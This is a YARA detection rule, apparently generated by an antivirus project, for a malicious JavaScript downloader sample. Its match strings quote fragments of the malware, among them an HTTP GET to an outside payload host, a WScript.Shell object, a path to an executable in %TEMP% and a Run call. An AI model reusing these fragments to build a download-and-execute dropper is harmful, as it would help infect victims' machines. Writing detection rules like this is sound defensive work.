rule sig_20160330_7ae36bc3bb95c79030080f5479667d16 {
  meta:
    description = "datamaliciousorder - file 20160330_7ae36bc3bb95c79030080f5479667d16.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e2dcda71fda13d03608348f8742c04e644460c8a284d236617faadad6f386559"

  strings:
    $s1  = "TH[U](\"GET\", \"http://tools24.nl/w8isa\", false);" fullword ascii
    $s2  = "var XJ0 = function Z() {return WScript[O](\"WScript\"+\".Shell\");}(), TB = 11;" fullword ascii
    $s3  = "function Z0(R1, M0){L = L * 1; return R1 - M0;};" fullword ascii
    $s4  = "if (TH[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function UL() {return XJ0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"NsrR6Jjz.ex\" + \"e\";};" fullword ascii
    $s6  = "function PW(){return TW + \"\";};" fullword ascii
    $s7  = "function K0(B1){XJ0[\"Run\"](B1, L, L);};" fullword ascii
    $s8  = "function GQ() {return ((XJ == true) && (XJ == N)) ? 1 : L;};" fullword ascii
    $s9  = "function K()" fullword ascii
    $s10 = "function R(){return 22;};" fullword ascii
    $s11 = "function D(){return O;};" fullword ascii
    $s12 = "}while (OX);" fullword ascii
    $s13 = "var AD = new this[\"Date\"]();" fullword ascii
    $s14 = "return Z0(RA, HY);" fullword ascii
    $s15 = "function UM(MQ) {var QW = (1, 2, 3, 4, 5, MQ); return QW;};" fullword ascii
    $s16 = "N = true; " fullword ascii
    $s17 = "XJ = true; " fullword ascii
    $s18 = "var XJ = false;" fullword ascii
    $s19 = "} catch(NQ){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}